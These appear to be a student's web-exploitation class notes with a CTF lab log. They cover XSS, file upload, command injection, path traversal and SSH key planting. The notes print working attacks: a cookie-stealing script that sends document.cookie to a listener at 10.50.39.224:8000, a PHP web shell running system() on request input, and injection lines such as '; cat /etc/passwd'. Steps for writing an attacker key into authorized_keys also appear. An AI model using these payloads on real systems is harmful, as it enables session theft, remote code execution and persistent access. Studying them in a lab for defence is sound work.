## HTTP Methods
* GET
* POST
* HEAD
* PUT
## HTTP Response Codes
* 10X - Informational
* 2XX - Success
* 30X = Redirection
* 4XX - Client Error
* 5XX - Server Error
## HTTP Fields
* User-Agent
* Referer
* Cookie
* Date
* Server
* Set-Cookie
## JavaScript Interaction
```
<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>
```
* JS Demo - http://10.50.XX.XX/java/Javademo.html
## Enumeration
* ROBOTS.TXT
  - If you find this file, go to it and enumerate (There might be something important here)
* Legitimate surfing
* Tools:
  - NSE scripts
  - Nikto
  - Burp suite (outside class)
## Cross-Site scripting (XSS) Overview
* Insertion of arbitrary code into a webpage, that executes in the browser of visitors
* Unsanitized GET, POST, and POST methods allow JS to be placed on websites
* Often found in forums that allow HTML
## Reflected XXS
* Most common form of XSS
* Transient, occurs in error messages or search results
* Delivered through intermediate media, such as a link in an emial
* Characters that are normally illegal in URLs can be Base64 encoded
## Stored XSS
* Resides on vulnerable site
* Only requires user to visit page
```
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
```
## <script>document.location="http://10.50.39.224:8000/"+document.cookie;</script>

## Useful Javascript components
* Proof of concept (simple alert)
  - `<script>alert('XSS');</script>`
* Capturing Cookies
  - `document.cookie`
* Capturing Keystrokes
  - `bind keydown and keyup`
* Capturing Sensitive Data
  - `document.body.innerHTML`
## Server-Side Injection
* Ability to read/execute outside web server's directory
* Uses `../../` (relative Paths) in manipulating a server-side file path
* `www-data` is the user that web servers on ubuntu or Apache, Nginx
## Malicious File Upload
* Server Doesnt Validate extension or size
* Allows or code execution (shell)
* Once uploaded
  - Find your file
  - Call your file
#### Establishes a shell
```
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```
## Command Injection
* User input not validated
* Might contain the following in it’s code:
```
system("ping -c 1 ".$_GET["ip"]);
```
* Run the following to chain/stack our arbitrary command
```
; cat /etc/passwd
```
## Key Regen (SSH)
```
ssh-keygen -t rsa -b 4096
cat  /.ssh/id_rsa.pub
echo "your key from the cat" > /var/www/.ssh/authorized_keys
```
# Demo
```
python3 -m http.server # This makes a webserver
<script>document.location="http://10.50.39.224:8000/"+document.cookie;</script> # This script steals cookies from users and sends it to our webserver
```
# CTF
```
64 bytes from 10.100.28.33: icmp_seq=1 ttl=64 time=0.191 ms
64 bytes from 10.100.28.34: icmp_seq=1 ttl=63 time=1.31 ms
64 bytes from 10.100.28.35: icmp_seq=1 ttl=63 time=2.58 ms
64 bytes from 10.100.28.40: icmp_seq=1 ttl=63 time=0.593 ms
64 bytes from 10.100.28.48: icmp_seq=1 ttl=63 time=0.608 ms

Nmap scan report for 10.100.28.48
Host is up (0.00049s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524

```



map scan report for 10.100.28.33
Host is up (0.00031s latency).
All 1000 scanned ports on 10.100.28.33 are closed

Nmap scan report for 10.100.28.34
Host is up (0.00043s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 10.100.28.35
Host is up (0.00041s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 10.100.28.48 and 40
Host is up (0.00046s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCqbKV61PY2E5VOANSMe2mTjMvYofPXYSWBrmCJ6eepiRvLXAJSjU9cZ3x+qYPZy2nfhQxtgDMnwiGfc6QapSViNIVMPLoT7e3VHbfmkDCOGnpCk2KjsWm7hd4Ts3XWncbl9fyR36MiUr0ng/b3gVRmIWZjxAUx8BKt3OVUZCwo+JKGVDiJTqfYeeqSmQUJmPzcqX1MyVscyXmiBV84X4qWfIOV2WitK1u6V5ZG/OgX78rOSZRWN6CtieMspicpxkPg7yKMJ523tHkfUSKJPf8j/Qh9O1jRk+D+pYx6KH3EsExOhdx1816CT+IffPS/C9bfLGgZmtCO82a1UWzolldB9TWOl+7RDljgxvYn5uGrqOCmtGnSSkpsSfnzFM5xEyUi3ea30n/WqXOBuaKD/cvMZ9qocHeD9I1ZalalZF4TgqD6AzoA+a6DDrfw2n7+NmDnzMX9huFFESIxFl7TjsRqjWJS3XpTSKUkWukBr5FPp69uw4zYrASYLbp2xDSZBCo2JAk+MFz/UG38gBgYfjVwCwFrnJEUBoCGGlflxtWPXKfggGytMnlXTZjFTM3hGSM5nSEj2L2Lu06Peij9KyTojvSkwWJVVYp7w+aZ7x5M2RXBCagieARzTpytrGJE8Q+QsLJWAwlPZ7W8FokNvYlIFqQf1Jq81hb8dS0BsrbDsw== student@lin-ops

from the web server

; mkdir /home/billybob/.ssh
; mkdir /var/www/.ssh

then you can ssh after the echo cmmands usinf "authorized_keys"
10.100.28.55

../../../../../etc/passwd




